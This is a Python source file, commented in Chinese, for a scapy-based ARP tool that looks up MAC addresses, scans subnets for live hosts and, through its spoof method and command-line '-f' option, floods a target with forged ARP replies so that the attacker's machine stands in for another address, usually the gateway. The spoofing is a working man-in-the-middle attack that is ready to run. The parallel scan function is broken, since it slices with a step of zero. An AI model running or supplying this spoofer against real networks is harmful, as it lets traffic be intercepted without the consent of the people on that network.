import concurrent
import ipaddress
import sys
from argparse import ArgumentParser
from concurrent.futures.process import ProcessPoolExecutor

from scapy.layers.l2 import *
sys.path.append('..')
from Network.Tools import Tools

class Arp:


    def __init__(self, ether_name, timeout, verbose):
        """
        ARP，因为二层协议，所以必须指定网卡
        :param ether_name: 网卡名
        :param timeout: 超时时间
        """
        self.__ether_name = ether_name
        self.__mac, self.__ip = Tools.get_network_info(self.__ether_name)
        self.__timeout = timeout
        self.__verbose = verbose


    def who_has(self, pdst):
        """
        arp协议中的who-has命令，使用arp协议获取指定ip地址的mac地址
        :param: 目的地ip地址
        :return: 目标ip地址对应的mac地址
        """
        arp_packet = Ether(dst=Tools.Ether_BoardCast,
                           src=self.__mac) / \
                     ARP(op='who-has', hwsrc=self.__mac, psrc=self.__ip,
                         hwdst=Tools.Ether_Empty, pdst=pdst)

        response = srp1(arp_packet, iface=self.__ether_name,
                        timeout=self.__timeout, verbose=self.__verbose)

        return response.getlayer(ARP).hwsrc if response else None


    def spoof(self, pdst, pfake, interval=0.2, hwdst=None):
        """
        arp欺骗
        :param pdst: 目的地ip地址
        :param hwdst: 被攻击的主机mac地址
        :param pfake: 伪装的ip地址，一般为网关地址
        :param interval: arp请求发送间隔
        """
        if hwdst is None:
            hwdst = self.who_has(pdst)

        arp_packet = Ether(src=self.__mac, dst=hwdst) / \
                     ARP(op='is-at', hwsrc=self.__mac, psrc=pfake,
                         hwdst=hwdst, pdst=pdst)
        sendp(arp_packet, iface=self.__ether_name, count=sys.maxsize,
              interval=interval, verbose=self.__verbose)


    def list_who_has(self, pdst_list):
        """
        请求一组ip地址，获取主机的mac地址
        :param pdst_list
        :return: 存活主机的mac地址
        """
        ip4s = list(ipaddress.ip_network(pdst_list).hosts())

        host = []
        for ip in ip4s:
            mac = self.who_has(str(ip))
            if mac:
                host.append({
                    'ip' : str(ip),
                    'mac': mac
                })

        return host


    def asycn_host_scan(self, pdst, process_count=4):
        """
        使用多核进行arp的主机扫描
        :param pdst: 目的地IP地址
        :param process_count: 核心数
        :return: 存活的主机列表
        """
        ips = list(ipaddress.ip_network(pdst).hosts())

        if len(ips) < 4:
            process_count = 1

        host =[]
        with ProcessPoolExecutor(max_workers=process_count) as executor:
            future_of_func = [executor.submit(self.list_who_has, ips[::i]) for i in range(0, process_count)]
            for future in concurrent.futures.as_completed(future_of_func):
                host.append(future.result())

        return host


class InteractionArp:

    @staticmethod
    def run():
        parser = ArgumentParser('arp tools')
        parser.add_argument('-e', '--ether', type=str, required=True, help='the ether name')
        parser.add_argument('-p', '--pdst',  type=str, required=True, help='the ip of destination host')
        parser.add_argument('-t', '--timeout', type=float, default=1, help='the time for wait the response')
        parser.add_argument('-i', '--interval', type=float, default=0.2, help='the interval of arp spool packet send')
        parser.add_argument('-v', '--verbose', action='store_false', help='display debug information')

        group = parser.add_mutually_exclusive_group()
        group.add_argument('-f', '--pfake', type=str, help='the spool ip, always set as gateway')
        group.add_argument('-s', '--scan', action='store_true', help='scan the active hosts')
        args = parser.parse_args()

        arp = Arp(args.ether, args.timeout, args.verbose)
        if args.pfake:
            arp.spoof(args.pdst, args.pfake, args.interval)
        else:
            hwsrc = arp.who_has(args.pdst)
            if hwsrc:
                print(f'ip = {args.pdst}, mac = {hwsrc}')
            else:
                print(f'ip = {args.pdst} do not find')


if __name__ == '__main__':
    InteractionArp.run()